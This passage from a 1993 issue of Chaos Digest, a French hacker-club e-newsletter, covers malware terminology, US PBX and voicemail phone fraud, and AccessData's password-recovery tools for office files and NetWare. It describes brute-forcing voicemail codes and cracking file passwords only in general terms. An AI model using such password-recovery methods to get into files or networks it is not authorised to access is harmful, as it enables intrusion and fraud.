trashing of data by the Ogre/Disk Killer virus, one of the most damaging,
was originally intended to be reversible, were it not for an error on the
part of the programmer.  Any program which makes changes to the computer
system that are unknown to the operator can cause trouble, the more so when
they are designed to keep spreading those changes to more and more systems.

However, it is going to far to say, as some have, that the very existence
of viral programs, and the fact that both viral strains and numbers of
individual infections are growing, means that computers are finished.  At
the present time, the general public is not well informed about the virus
threat, and so more copies of viri are being produced than are being
destroyed.  As people become aware of the danger, this will change.

If we stick to a strictly "Cohenesque" definition of viral programs as only
those which attach to specific programs, then there are some difficulties
with defining other, similar, programs which reproduce themselves, but
without being linked to a specific program.

Unfortunately, although attempts have been made to address this issue,
there is, as yet, little agreement as to the terminology.

In early multi-tasking operating systems, programs often "broke the
bounds", and would overwrite sections of other programs or data.  Since
this damage was generally random, the pattern of damage, when mapped, gave
the appearance of twisting tracks which appeared and disappeared.  This
closely resembled the patterns seen when cutting through a piece of worm
eaten wood, giving rise to the term "worm" for such rogue programs.  One
such program escaped not only from its own partition within the computer,
but actually escaped from the original computer to another over an early
computer networking system.  The term "worm" has therefore come to be used
to refer to viral programs which do not attach to specific programs, and,
more specifically, to those which use network communications as a vehicle
for spreading and reproduction.

Two examples of this usage are the famous Morris/Internet/UNIX worm of late
1988, and the lesser known CHRISTMA EXEC mail worm of December 1987.

This still leaves a class of viral programs which do not attach
specifically to programs.  There are actually many sub-groupings within
this group, and there are within viral programs generally.  However,
European researchers, particularly those from France, often refer to such
programs as "bacteria", rather than viri.

In these areas of terminology there is often much debate about whether a
given virus, or type of viral program, fits into a given class.  Boot
sector infectors, for example, would not appear to fit the definition of a
virus as infecting another program, since BSI's can be spread by disks
which do not contain any program files.  However, the boot sector of a
normal disk, whether or not it is a "system" or bootable disk, always does
contain a program (even if it only states that the disk is not bootable),
and so it can be said that a BSI is a "true" virus.

Two other groups of security breaking programs are very often confused with
viri.  The first is the "trojan horse", the second the "logic bomb."  The
confusion is understandable, as viral type programs, trojan horses and
logic bombs make up the three largest distinct groups of security breaking
software, and often one may "contain" the code of one another.

A trojan horse is a program which pretends to do one thing, while
performing another, unwanted action.  The extent of the "pretence" may vary
greatly.  Many of the early PC trojans relied merely on the filename and a
description on a bulletin board.  "Login" trojans, popular among university
student mainframe users, will mimic the screen display and prompts of the
normal login program, and may, in fact, pass the username and password
along to the valid login program, as well as stealing it.  Some trojans may
contain actual code which does what it is supposed to be doing, while
performing additional nasty acts that it does not tell you about.  (I make
the distinction that trojans are always malicious, as opposed to "joke" or
"prank" programs.)

(A recent example of a trojan is the "AIDS Information Disk", often
incorrectly identified in both the general and computer trade press as a
virus.  Not to be confused with the, fairly rare, AIDS I and II viri, this
program appears to have been part of a well organized extortion attempt.
The "evaluation disks" were shipped to medical organizations in England and
Europe, with covers, documentation and license agreements just like any
real commercial product.  When installed and run, it did give information
and an evaluation of the subject's risk of getting AIDS, but it also
modified the boot sequence so that after 90 reboots of the computer all
files on the disk were encrypted.  The user was informed that, in order to
get the decryption key, a "license fee" had to be paid.)

Trojan horse programs are sometimes referred to as an "Arf, arf" or
"Gotcha" program from the screen messages of one of the first examples.  A
trojan horse may be used to plant a virus simply by infecting any existing
program.

A logic bomb is a malicious program which is triggered by a certain event
or situation.  Logic bomb code may be part of a regular program, or set of
programs, and not activate when first run, thus having some of the features
of a trojan.  The trigger can be any event that can be detected by
software, such as a date, username, CPU id, account name, or the presence
or absence of a certain file.  Viral programs and trojans may contain logic
bombs.

------------------------------

Date: Sun Jan 24 09:37:49 EST 1993
From: mis@seiden.com (Mark Seiden )
Subject: File 4--Le Pheacking americain vu du cote francais
Copyright: Agence France Presse, 1992

  Eco. TIE. ind. -  USA/piratage telephonique: un prejudice croissant
pour les entreprises- par Souk CHANTHALANGSY- WASHINGTON, 7 nov  92
(600 MOTS)
  Devenu une affaire lucrative et presque sans risque, le piratage
telephonique atteint des proportions inquietantes aux Etats-Unis ou,
selon les experts, il fait perdre chaque annee des centaines de
millions de dollars aux entreprises americaines.
  Ce type de fraude est d'autant plus redoutable qu'il n'existe, a
l'heure actuelle, aucune parade d'une efficacite absolue contre ces
pratiques qui font appel a des techniques informatiques
sophistiquees, selon un groupe d'experts reuni recemment sur ce sujet
a Washington par la Commission federale sur les communications (FCC).
  Ainsi, entre 1989 et 1992, plus de 550 cas de piratage
telephonique ont ete recenses au sein des quelque 700 entreprises
formant l'Association internationale des communications (ICA). Le
prejudice a ete evalue a 73,5 millions de dollars representant en
grande partie des appels internationaux, soit une moyenne de plus de
130.000 dollars pour chaque fraude.
  La quasi-totalite de ces piratages a ete menee par intrusion dans
les standards informatises ("private branch exchange", PBX) et/ou
dans les boites aux lettres vocales ("voice mail") des societes
piratees. Un autre type de fraude consiste a utiliser des cartes de
credit telephoniques dont le code secret a ete prealablement "casse".
"Ces pratiques constituent un exemple flagrant de la fragilite de
l'industrie des telecommunications", a estime le vice-president de
l'ICA, Lawrence Gessini.
  Les exemples de fraudes, evoques devant la FCC, sont nombreux. En
juin, une banque du groupe financier americain Leucadia Financial
Corporation a vu le nombre d'appels sur son numero gratuit passer
d'une centaine a plus de dix mille. La fraude n'a ete decouverte
qu'apres reception de la facture de la compagnie ATT: 250.036 dollars
pour ce seul mois, dont plus de 215.000 pour des appels en Republique
dominicaine.
  Selon un responsable du groupe bancaire Thomas Mara, les pirates
sont entres avec un ordinateur dans la ligne telephonique gratuite de
l'etablissement. En forcant le systeme de boite aux lettres vocales
et en essayant toutes les combinaisons d'acces a partir du zero, ils
ont trouve le mot de passe actionnant la ligne.
    D'apres William Cook, un ancien procureur de Chicago devenu
specialiste de la lutte contre les fraudes informatiques, des
centaines d'intrusion dans les standard telephoniques sont tentees
chaque jour aux Etats-Unis. En 1989, au cours d'un week-end prolonge,
une entreprise avait ainsi perdu 1,4 million de dollars, ses lignes
ayant ete "piratees" par des inconnus.
   Les equipementiers en materiels telephoniques accusent
generalement les victimes de n'avoir pas su proteger leur systeme
PBX, les victimes font grief aux equipementiers de ne pas les avoir
prevenues de la vulnerabilite du systeme et les deux se tournent vers
les compagnies de telephone. Entre 25 et 30 % du prejudice est
generalement assume par les compagnies de telephone.
      Une unite d'action est necessaire, selon les experts, pour
lutter contre ce piratage qui se traduit chaque annee par "des
milliards de dollars de manque a gagner pour l'economie" et qui
"menace la solvabilite de plusieurs centaines de petites entreprises
du pays", affirme M. Cook qui preconise un renforcement des sanctions
afin de dissuader les malfaiteurs.
   "Les risques sont si peu importants et les condamnations si
faibles que des trafiquants de drogue quittent le secteur des
stupefiants pour se lancer dans la fraude telephonique", a-t-il
encore indique.
   sc/rok/mpf

------------------------------

Date: Wed Jan 20 21:31:33 PST 1993
From: eggert@twinsun.com (Paul Eggert )
Subject: File 5--Horloge en panne, pourquoi?

A stopped clock never foils?

One way to discourage intruders from using covert channels to foil security is
to turn off the system clock, or at least to hide it from users.  But this
breaks a lot of software, so it's too drastic for all but the most
security-conscious sites.  So I was surprised to see J.-B. Condat's letter in
RISKS 14.28, which began:

  Date: 31 Dec 69 23:59:59 GMT
  From: jbcondat@attmail.com
  Subject: New E-journal on computer security
  [...]

Unix cognoscenti will recognize that date: it corresponds to the internal Unix
time value of -1, which is returned by system functions when the clock is not
available.  I guess Condat and the Chaos Computer Club France must really be
practicing what they preach!

+++++++

Date: Wed Jan  6 06:47:56 CST 1993
From: HART@vmd.cso.uiuc.edu ("Michael S. Hart" )

On 31 Dec 69 23:59:59 GMT you said:

Your message took about a week to get here. . .and thus was very hard to find,
as my mailer sorts by date, and yours was at the bottom.

Therefore I would suggest you preface your subject lines with !!! to make them
easier for me to spot.

Thank you for your interest,

Michael S. Hart, Professor of Electronic Text
Executive Director of Project Gutenberg Etext
Illinois Benedictine College, Lisle, IL 60532
No official connection to U of Illinois--UIUC
hart @uiucvmd.bitnet or hart@vmd.cso.uiuc.edu

+++++++

Date: Sat Jan 23 14:14:46 PST 1993
From: levene@aplpy.jhuapl.edu (Robert A. Levene )

----
> my message are date-stamped with the same time :-)
----

Please let him know that in English, this is known as a
"mistake which needs explaining" or a "lie."

------------------------------

Date: Sat Dec 26 12:31:11 GMT 1992
From: uldis@inkomi.riga.lv (Uldis Bojars )
Subject: File 6--Jeune Lettonien a la recherche de correspondants

To: Jean-Bernard CONDAT
    Chaos Computer Club France [CCCF]


    Hello !

 Harry Bush published some information about CCCF in our local
 echo.  I read it and decided to write You !

 At first let me wish You a Merry Christmas and happy New Year.


 I'm latvian teenager (i'm 18) and am studying computer sciences
 now.  My name is Uldis Bojars.  My interests lay mainly in
 programming and hacking field.  I'm interesting about phreaking,
 too, but have never built bluebox or somewhat like that. Favorite
 programming language - C, but i wanna program in Asembler, too.

 It would be nice to have a penfriend in France.  I'll be happy
 to discuss about life, programming, and much more.  I can't
 write French because I'm learning it about 2 months only.  But
 i think i will be able to understand French text...

 I'll try to call Your BBS to get to know more about CCCF.
 And - is it possible to get book You mentioned in letter
 - '_C'est decide! J'ecris mon virus' ?
 I'm not writing viruses, but i haven't got any literature
 about computers in French.

 I'll be happy to receive letters from CCCF.     /\
                                                /  \
 Sincerely Yours,                               /  \
              Uldis                            /    \
                                              /-    -\
                     Bon et heureux Noel !       ||
----------------------------------------------------------------------
About myself:  Uldis Bojars
               18 years old
               Email: uldis@inkomi.riga.lv
               i like science fiction, music (especially Beatles)
               i'm runing my own BBS

------------------------------

End of Chaos Digest #1.05
************************************

Chaos Digest               Lundi 1 Fevrier 1993        Volume 1 : Numero 6

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.06 (1 Fev 1993)
NUMERO SPECIAL--PROGRAMMES DE RESTITUTION DES MOTS DE PASSE
File 1--Ouvre-boite pour mots de passe difficile
File 2--Communique de Presse Americain
File 3--Terroristes boliviens et WordPerfect (Reprint)
File 4--NTPASS, module chargeable sous NetWare (Reprint)
File 5--Qui est AccessData, Inc.? [societe et marque deposee]
File 6--Breve dans la presse francaise (Reprint)
File 7--Programmes de Restitution des Mots de Passe

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also
may be obtained from the mail server at jbcondat@attmail.com: all incoming
messages containing "Request: ChaosD #x.yy" in the "Suject:" field are
answered (x is the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Mon Feb  1 12:55:12 CST 1993
From: jbcondat@ATTMAIL.COM (Jean-Bernard Condat )
Subject: File 1--Ouvre-boite pour mots de passe difficile


     Qui n'a pas reve de pouvoir ouvrir sans scrupule un document protege
par un mot de passe que votre secretaire par trop consciencieuse aurait
decide de mettre sur un document de travail? La solution n'est pas simple.
Si votre document ou votre reseau est protege, il y a une raison pour cela.
Contourner ce probleme, ne rentre plus dans une optique tres catholique.

     Aussi ai-je ete tres etonne de lire deux articles de presse francais.
Ils traitaient d'un ensemble de produits specialises dans "la restitution
des mots de passe" [file 6].

     Je pris immediatement contact avec M. Serban de la Societe ANDA de
Vincennes qui n'hesita pas, en deux minutes, a me faxer un etonnant
communique de presse [file 7] et a me donner sa plus prestigieuse
reference: le secretariat du Premier Ministre!

     L'attachee de presse d'ANDA, Florence PROVOST, se deplaca pour une
demonstration sur site. Son document publicitaire parlait de
"reconstruction" a certains endroits, et de "restitution" a d'autres. La
definition du sigle PRMP etait aussi inconnue pour elle que l'utilisation
du logiciel XLPASS qu'elle tenta de faire sur un fichier Excel 2.0
fraichement cree sur mon Macintosh SE/30.

     Voici le rapport que je reussi a imprimer apres une recherche "rapide"
de 63 secondes:

                 +++++++++++++++++++++++++++++++++++++++
                 XLPASS Password Recovery Report.

                 Evaluation Copy. Not for resale.
                 Today's Date : Lun 18 Jan 1993    10:21
                 Number of files decrypted : 1
                 * * * * * * * * * * * * * * * * * * * *
                 File recovered : ABC
                 Creation Date : Lun 18 Jan 1993
                 Modified Date : Lun 18 Jan 1993
                 File size : 1024

                 File Protection Password:   jbc
                 +++++++++++++++++++++++++++++++++++++++


Je decidai de faire une petite recherche sur ce produit dans differentes
sources publiques. Tout d'abord, la societe AccessData, Inc., est un petite
structure d'Orem, UT aux USA. Elle possede sa marque depuis le 21 Octobre
1991 [file 5].

Alison Eliason, directeur du service client d'AccessData me fit parvenir un
communique de presse [File 2], ainsi que deux articles [Files 3-4]. Elle me
signala que le distributeur le plus proche de chez moi est:

     *Key Exchange Services Limited*
     30 Heath Road, Twickenham, Middlesex TW1 4DE, Grande-Bretagne
     Tel.: 081-744 1551, Fax: 081-744 0476

Olivier Schmidt-Berteau de cette societe anglaise me declara:

> Je vous prie de croire que nous avons conscience des risques d'une
> utilisation illicite de ces produits. C'est pourquoi nous avons veiller a
> etablir des garde-fous en limitant l'acces a nos logiciels.

> Ainsi chaque client doit retourner un accord signe par le responsable
> produit et contresigne par un membre de la direction. Cet accord
> [Password Recovery Programs--Agreement] stipule explicitement les
> conditions d'utilisation licites du logiciel et leurs limites.

> De plus, chaque logiciel vendu a son propre code d'acces. La delivrance
> du code d'acces par notre societe est subordonnee a la signature de
> l'accord mentionne ci-dessus. En ce qui concerne NTPASS, logiciel
> Password Recovery operant sur reseau Novell, le code d'acces est compose
> a partir du numero de serie du reseau et est donc propre a ce reseau.

> Finalement, le logiciel a ete volontairement limite par un caractere de
> securite. Password recovery ne restituera pas un mot de passe contenant
> ce caractere. Ceci permet d'avoir un deuxieme ecran de securite contre
> toute utilisation abusive.

> [...] Ce logiciel a ete explicitement autorise a l'exportation par le
> gouvernement des Etats-Unis pour une liste limitative de pays, dont la
> France.

> [...] jusqu'a present nos principaux clients ont ete des institutions
> publiques et leurs organes de securite. Ces derniers ont utilise notre
> produit principalement pour acceder a des fichiers informatiques
> verouilles, contenant des informations illicites ayant valeur de preuves.

> La liste de cee institutions va du FBI americain, de la Police Danoise,
> de l'Office des Fraudes de Scotland Yard au Ministere de la Defense
> britannique. Considerer ces clients comme etant des pirates me parait
> etre irreverencieux, au pire diffamatoire.

Chaotiquement votre,

jbc
--
   _-_|\    Jean-Bernard Condat
  /     \   Chaos Computer Club France [CCCF]   B.P. 8005
  \_.-*_/   E-Mail: jbcondat@attmail.com        69351 Lyon Cedex 08, France
       v    Phone:  +33 1 47874083              Fax:  +33 1 47877070

------------------------------

Date: Sat Jan 30 19:44:00  1993
From: Antoine_Schmitt@NeXT.COM (Antoine Schmitt )
Subject: File 2--Communique de Presse Americain

NEWS RELEASE
FOR IMMEDIATE RELEASE

CONTACT:

Allison Eliason\AccessDate, Inc.
801/224-6970 or 800/658-5199


                       PASSWORD  LOCKED  FILES ?

     OREM, UT--What does a company do when its payroll officer dies or
is terminated, leaving behind inacessible files--locked by a private
password?  Companies around the world have agonized over being locked
out of their own files because of employee spite or accident.

     AccessData in Orem, Utah--a company which specializes in data
recovery software--has released several  password  recovery  software
programs.  AccessData has password recovery software available for
WordPerfect, Lotus 1-2-3, Microsoft Excel, Quattro Pro, Paradox, and
many other software packages.  AccessData's software recovers the
password used to lock documents with the encryption process available
in many of the major software companies programs.

     "Most companies do not use passwords for fear of having critical
documents locked by unknown passwords," said AccessData president,
Eric Thompson.  "Now companies can recommend with confidence that
their employees use passwords to secure all documents. If a password
is lost or forgotten, one of our programs can be used by the systems
administrator as a master key to unlock the file."

     For instance, an information systems director for a large
Oklahoma credit union was able to use the WordPerfect version of the
program (WRPASS) to unlock critical documents left behind by employees
dismissed from the firm on bad terms.  "If I did not have this
password recovery program, I would not recommend the use of
passwords," the systems director said.  "Now we use passwords to
increase security and prevent unauthorized access to sensitive files
without the threat of losing irreplaceable data."

     Government agencies have also found the use of AccessData's
password recovery programs invaluable.  In Washington D.C., FBI agents
obtained a floppy disk which contained the diary of a man suspected of
arson.  Using WRPASS, the agents unlocked the diary and solidified the
case.  The FBI, CIA, Secret Service and all branches of the Armed
Services have purchased password recovery software from AccessData.

     Using block-frequency analysis, AccessData's programs analyze
frequently occuring patterns in the encoded file as a basis for
determining the unknown password.  The software is well documented and
features on-line help.  To protect against unauthorized use, the
program has a security feature built in which requires the user to
enter an access code before password recovery can begin.

     Suggested retail is $185.00 for programs sold within the United
States.  AccessData offers discounts to government agencies and
educational institutions as well as quantity discounts.

------------------------------

Date: Fri Jan 29 10:29:46 EST 1993
From: LUX%DMRHRZ11.BITNET@VTVM1.CC.VT.EDU (Harald Lux )
Subject: File 3--Terroristes boliviens et WordPerfect (Reprint)
Copyright: Ziff-Davis Publishing Co., 1991


 Software  cracks  terrorists'  lock on seized files. (Access Data Recovery
     Service's WPPass)
 McCormick, John
 Government Computer News  VOL.: v10  ISSUE: n3  PAGINATION: p1(2)
 PUBLICATION DATE: Feb 4, 1991
 GEOGRAPHIC LOCATION: Bolivia
 PRODUCT  NAME(S):  WPPASS  (Utility  program)  -  Usage; WordPerfect (Word
    processing software) - Usage
 COMPANY NAME(S): Access Data Recovery Service - Products
 DESCRIPTORS:  Passwords;  Encryption;  Data  Security;  Bolivia; Political
    Issues; Military; Security Software; Utility Programs
 SIC CODE: 7372
 ISSN: 0738-4300

 Software Cracks Terrorists' Lock On Seized Files

  When Bolivian government forces seized WordPerfect files from a suspected
terrorist group late last year, the terrorists probably did not fear that
their secrets would become known to government forces.

     They had encrypted their files using WordPerfect's password file lock.
But using WPPass, a password-cracking software, U.S. officials gained
access to the files.

     "The U.S. government and my country team, in particular, thank you for
your critical assistance," said Robert S. Gelbard, U.S. ambassador to
Bolivia, in a letter to Eric Thompson, president of Access Data Recovery
Service of Orem, Utah. Access Data's WPPass package enabled U.S. officials
to crack the passwords.

     The most recent act of terrorism aimed at Americans in Bolivia took
place Oct. 10, when a bomb placed outside the residence of the embassy's
Marine Corps guards killed one Bolivian and injured another. Three U.S.
Marines inside the building, although shaken by the blast, were not
injured.

     Randolph Marcus of the State Department's counterterrorism section in
Washington confirmed that the embassy had experienced several terrorist
attacks last year. "In the wake of the Panama invasion last year there were
several bombings in the vicinity of the embassy," Marcus said. "The most
recent one was the Marine House."

     Marcus said the attack on Marine House was being blamed on the CNZP,
or Nestor Paz Zamora Committee faction of the Army of National Liberation,
a leftist terorist group in Bolivia.

     The files apparently contained information on terrorist activities. No
information was available on how the government forces captured the files.

     After being contacted by several Army majors in December, Thompson
sent a copy of his company's password-busting software to the embassy.

     Thompson said WPPass, which works with many versions of WordPerfect,
analyzes password-protected files using statistical analysis of the
frequency of letters used in words contained in the file.

     Access Data bases its password-cracking programs on the normal
frequency of letters occurring in English words and sentences.

     Thompson said the programs have proven useful for other languages.

     Multilingual Capabilities
     In English, German and French, the letter "E" is the most often used,
experts have determined. To decode a block of text, one could find the most
common letter, assume it was substituted for "E," and proceed down the list
of single letters and pairs of letters according to their normal rate of
occurrence.

     Although Italian, Spanish and Portuguese differ in terms of which
individual letters are most common, enough similarities exist to let the
password-cracking software produce a useful analysis in many cases.

     WPPass and the company's other products are not general-purpose file
decryption utilities.

     They work with text files generated by specific programs, including
Word Perfect, Lotus Development Corp.'s 1-2-3 and Microsoft Corp.'s Excel

     The password-cracking programs do not decode an encrypted file and
convert it to plain text. Instead, they attempt to figure out the password
used to encrypt the file.

     Although these programs refer to their file-locking schemes as
"password protection" systems, what they actually do is use a user-selected
password as the encryption/decryption key.

     Analysis of the file can yield the password.

     Gelbard, a career diplomat, joined the State Department in 1967 and
was appointed ambassador to Bolivia in 1988.

     Bolivia, a landlocked mountainous country about the size of Texas and
California combined, has been controlled by a military dictatorship in the
past. Now it has a democratically elected government.

     War on Drugs

     The United States has been pressuring the Bolivian government to
reduce the production of coca leaves, which are processed into cocaine.

     A former official of a U.S. intelligence agency who insisted on
anonymity said this emphasis to cut the supply of one of the country's
major cash crops has led to clashes between Bolivian police and coca
growers, as well as a general increase in anti-United States sentiment.

     Marcus indicated the investigation related to the ambassador's letter
was continuing.

     State officials declined to comment on information obtained from the
terrorists' files, how the files are being used by the Bolivian government
or details relating to possible terrorist activities.

     Thompson said Access Data Recovery Service's products normally are
sold to businesses and government agencies that need access to their own
files to which the passwords have been lost. Thompson said he also works
with law enforcement and intelligence agencies, but he did not elaborate.

------------------------------

Date: Thu Jan 28 23:35:25 +0100 1993
From: langlois@ciril.fr (Langlois Ph. )
Subject: File 4--NTPASS, module chargeable sous NetWare (Reprint)
Copyright: Professional Press Inc., 1992


 TITLE: Password recovery. (Brief Article: NTPASS password recovery program
     from  AccessData for the NetWare network operating system is a NetWare
     Loadable Module) (Product Announcement)
 JOURNAL: LAN Computing  VOL.: v3  ISSUE: n9  PAGINATION: p49(1)
 PUBLICATION DATE: Sept, 1992
 ARTICLE TYPE: Product Announcement
 AVAILABILITY:  FULL TEXT Online  LINE COUNT: 00016
 SOURCE FILE: CD File 275
 OPERATING PLATFORM(S): NetWare
 PRODUCT NAME(S): NTPASS (Data security software) - Product introduction
 COMPANY NAME(S): AccessData - Product introduction
 SIC CODE: 7372
 ISSN: 0896-145X
 DESCRIPTORS: Product Introduction; Passwords; Security Software; Add-In/On
    Software; Data Security

  AccessData announced NTPASS, a Novell NetWare password recovery program
that lets users change any password without the knowledge of any previously
existing passwords.
  NTPASS is a standard NetWare Loadable Manager that can only be loaded at
the file server. In order to run it, an access code must be obtained from
the company and entered. Since the access code is a derivative of the
NTPASS serial code and NetWare serial number, each version of NetWare
requires a different code. Once the code has been entered, users can change
any NetWare password, including the supervisor's password.

     For more information, contact AccessData, 87 E. 600 S., Orem, Utah
84058; (801) 224-6970.

------------------------------

Date: Tue Jan 26 18:59:41 -0800 1993
From: jbcondat@ATTMAIL.COM (Jean-Bernard Condat )
Subject: File 5--Qui est AccessData, Inc.? [societe et marque deposee]
Copyright: TRADEMARKSCAN(r)-Federal, 1993

     ACCESSDATA

     125 STARCREST DR
     OREM, UT 84058-

Current as of:     930111


TRW Company Number: Y00365207

ADDITIONAL PAYMENTS
--------------------
                                                         % of Accounts
                                                       --Days Past Due--
  Creditor   TRW  Sale Terms         High                 1-  31  61  91
  Category   Date Date             Credit    Balance Cur  30  60  90  +
------------------------------------------------------------------------
  AIR TRANS  9207  N/A VARIED          $0         $0   0   0   0   0   0
  Comment: SATSFTRY   AGED



  PUBLIC RECORD INFORMATION
=============================
COLLATERAL COUNTS
-----------------

Company has   1 UCC filings with   1 collateral item(s).


UCC DETAILS
-----------

Date
Filed  Legal Description   Document #      Document Location
------------------------------------------------------------
921123 UCC-FILED            42683            SEC STATE,  UT
       UNDEFINED 42683

+++++++

ACCESSDATA

          INTL CLASS:   9 (Electrical and Scientific Apparatus)
          U.S. CLASS:  38 (Prints and Publications)
          STATUS: Registered
          GOODS/SERVICES: COMPUTER PROGRAMS AND INSTRUCTIONAL MANUALS SOLD
            AS A UNIT FOR FILE UTILITIES
          SERIAL NO.: 74-248,543
          REG. NO.: 1,732,702
          REGISTERED: November 17, 1992
          FIRST USE: October 21, 1991 (Intl Class 9)
          FIRST COMMERCE: October 21, 1991 (Intl Class 9)
          FILED: February 21, 1992
          PUBLISHED: August 25, 1992
          ORIGINAL APPLICANT: THOMPSON, ERIC (United States Individual), 87
            EAST 600 SOUTH, OREM, UT (Utah), 84058, USA (United States of
            America)
          OWNER AT PUBLICATION: THOMPSON, ERIC (United States Individual);
            D/B/A/ ACCESSDATA, 87 EAST 600 SOUTH, OREM, UT (Utah), 84058,
            USA (United States of America)
          FILING CORRESPONDENT: ANDREW C. HESS, CALLISTER DUNCAN-NEBEKER,
            SUITE 800, KENNECOTT BUILDING, SALT LAKE CITY, UT  84133

------------------------------

Date: Fri Jan 29 08:01:48 EST 1993
From: jbcondat@ATTMAIL.COM (Jean-Bernard Condat )
Subject: File 6--Breve dans la presse francaise (Reprints)
Copyrights: Groupe Tests et Micro-Systemes, 1993

                    MOT DE PASSE ET PASSE-PARTOUT
    (in: "L'Ordinateur Individuel", numero 37 [Fev 1993], page 60)

     Element de securite tres appreciable lorsqu'il protege contre les
indiscretions, le mot de passe devient un obstacle redoutable quand son
detenteur l'oublie ou encore quand un collaborateur ne le transmet pas
en quittant l'entreprise. Parfois il est alors indispensable de reinstaller
le reseau Netware...

     C'est pour epargner pareille mesaventure que la societe Access Data a
mis au point un ensemble de programmes de recouvrement des mots de passe
operant avec Netware et avec plusieurs grands logiciels de bureautique sous
MS-Dos ou Windows.

     Ces "Pass" sont a la fois simples a appliquer (l'utilisateur n'a
pratiquement pas a intervenir) et d'execution rapide: a titre indicatif, le
temps necessaire pour retrouver le mot de passe cryptant un fichier de
WordPerfect est de l'ordre d'une minute. Par mesure de securite, leur
utilisation est elle-meme protegee par un mot de passe.

     Distribues en France par la societe Anda, ces divers outils operent
sur les documents ecrits en allemand, espagnol, francais, italien et
portugais. Sur demande, ils sont fournis avec certains jeux de caracteres
convenant pour d'autres langues.

     Les Pass sous MS-Dos pour les applications WordPerfect, Word, Lotus
(1-2-3, Symphony et Quattro Pro), Paradox et Excel (il existe aussi une
version pour Macintosh) valent chacun 3 250 F ht.  L'ensemble des cinq
produits est vendu 9 750 F ht, et Anda propose egalement un Pass donnant
acces au reseau Novell et permettant de changer la totalite des mots de
passe, y compris celui du superviseur (5 400 F ht). Il est a signaler que,
dans ce dernier cas, le programme ne fonctionne que sur le ou les serveurs
pour lesquels l'utilisateur a obtenu un code d'acces delivre par Anda.

+++++++

                      WDPASS PERCE VOS SECRETS
                          Par V. Verhaeghe
          (in: "MicroSystemes", numero Jan 1993, pp. 34-5)


     La societe ANDA importe en France un ensemble d'utilitaires d'un genre
nouveau et assez etonnant. Ces programmes permettent en effet de retrouver
des mots de passe affectes a des documents Word au cas ou vous ne vous en
souviendriez plus.

     Cela pose evidemment un probleme de securite; s'il est possible de
trouver le mot de passe d'un fichier, rien n'interdit a un esprit
malveillant de detourner l'utilite premiere de WDPASS pour acceder a des
fichiers sensibles. Pour empecher cela, tous les produits du type PRMP
(Programmes de Reconstruction de Mots de Passe) de ANDA ne peuvent etre
vendus qu'a des societes et non a des particuliers.

     WDPASS ne fonctionne qu'avec des fichiers de type Word. ANDA propose
une version correspondant a la plupart des logiciels du marche. Ainsi,
LTPASS decrypte les fichiers Lotus 1-2-3, Symphonie (sic) et Quattro Pro,
PXPASS s'occupe des fichiers Paradox (DOS et Windows) et XLPASS des
fichiers Excel (DOS et Windows).

     L'utilisation de WDPASS est on ne peut plus simple. Vous le lancez
sous DOS, vous indiquez quel fichier est a decrypter et vous choississez un
des trois modes de recherche de mots de passe (lente, moyenne ou rapide).
Il est recommande d'utiliser tout d'abord le mode rapide puis d'etendre la
recherche si celle-ci s'est averee infructueuse. En quelques minutes, vous
pouvez ainsi recuperer les acces a plusieurs fichiers.

     Vous avez par ailleurs la possibilite de demander le decryptage de
plusieurs fichiers simultanement ou meme d'un repertoire entier.WDPASS
utilise une methode appele "analyse cryptique". La documentation affirme
que les mots de passe sont reconstruits a partir d'une "correlation des
divers modeles statistiques avec les configurations frequentes du fichier
crypte" et on ne saurait la dementir.

     Tout ce que l'on peut dire d'autre sur ce produit, c'est qu'il a tres
bien fonctionne pour les differents tests que nous avons effectues. ANDA
indique qu'il existe egalement une version pour NetWare (NTPASS) que nous
n'avons malheureusement pas eu la chance d'essayer. NTPASS peut communiquer
et changer le mot de passe de l'administrateur, meme si la personne qui
l'utilise n'a pas les droits d'acces suffisants.

     Etant donne qu'il est rare que l'administrateur perde son mot de
passe, NTPASS ne sera utile qu'en cas de malveillance d'un employe ayant
decide de faire un chantage au changement de mot de passe.

------------------------------

Date: Nov 18 1992
From: Florence Provost (22 rue de la Tremoille, 75008 Paris)
Subject: File 7--Programmes de Restitution des Mots de Passe

CONTACT:

ANDA, 2bis av. Foch, 94160 Saint-Mande
(1) 43 65 89 06 ou fax: (1) 43 65 96 22


Interet des Programmes de Reconstruction des Mots de Passe

Le besoin de securite dans l'utilisation des ordinateurs augmente. Pour
repondre a ce besoin, les editeurs de logiciels ont implante des fonctions
de securite dans leurs produits, comme par exemple les mots de passe. Il
arrive que pour differentes raisons les mots de passe soient perdus,
rendant les fichiers proteges inaccessibles.

Les PRMP permettent la restauration des mots de passe perdus,
deverrouillant ainsi les fichiers cryptes.

L'existence des PRMP encourage les utilisateurs a mettre en oeuvre les
fonctionnalites de securite des logiciels qu'ils utilisent. Les PRMP
representent une *Assurance Tous Risques* pour l'immense majorite des
utilisateurs.


Les PRMP disponibles

* WD Pass pour [Word sous] DOS et Windows;
* LT Pass pour Lotus 123, Symphonie (sic) et Quatro Pro (re-sic!) versions
Dos et Windows [et VP Planner];
* PX Pass pour toutes les versions Paradox, Dos et Windows, Works;
* XL Pass pour toutes les versions Dos et Windows de Microsoft Excel. Une
version Macintosh est aussi valable.
[* WR Pass pour toutes versions WordPerfect DOS, Windows et Macintosh;]
[* NT Pass operant sur le reseau Novell.]

Les programmes sont concus pour tous types d'utilisateurs, meme debutants.
Il est possible de deverrouiller un seul fichier, plusieurs fichiers a la
fois ou l'ensemble d'un repertoire. Les programmes sont rapides (un test de
l'Administration americaine indique qu'un IBM PC 386 Modele 80 de 16 MHz
met moins de 60 secondes pour trouver un mot de passe de WordPerfect),
